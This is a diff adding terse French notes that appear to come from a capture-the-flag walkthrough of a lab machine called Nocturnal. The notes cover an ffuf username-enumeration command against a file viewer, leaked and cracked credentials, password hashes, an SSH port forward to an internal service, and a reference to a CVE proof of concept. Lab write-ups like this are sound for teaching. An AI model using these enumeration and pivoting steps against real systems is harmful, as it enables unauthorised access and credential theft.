@@ -25,3 +25,34 @@ Nous ajoutons le domaine découvert à notre fichier hosts.
 ```
 echo "10.10.11.64 nocturnal.htb" | sudo tee -a /etc/hosts
 ```
+
+![[Pasted image 20250527003400.png]]
+
+```
+ffuf -u 'http://nocturnal.htb/view.php?username=FUZZ&file=*.pdf' -w
+/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -mc 200 -fr
+"User not found." -H "Cookie: PHPSESSID=4d9uqe8ifkefg1pkgu5ksi06qs"
+```
+
+
+http://nocturnal.htb/view.php?username=amanda&file=file.pdf
+
+![[Pasted image 20250527004606.png]]
+
+arHkG7HAI68X8s1J.
+
+
+admin:d725aeba143f575736b07e045d8ceebb
+tobias:55c82b1ccd55ab219b3b109b07d5061d
+
+
+tobias:slowmotionapocalypse
+
+netstat -tulpn 2>/dev/null
+
+ssh -L 8080:127.0.0.1:8080 tobias@10.10.11.64
+
+
+![[Pasted image 20250527005832.png]]
+
+CVE-2023-46818 poc
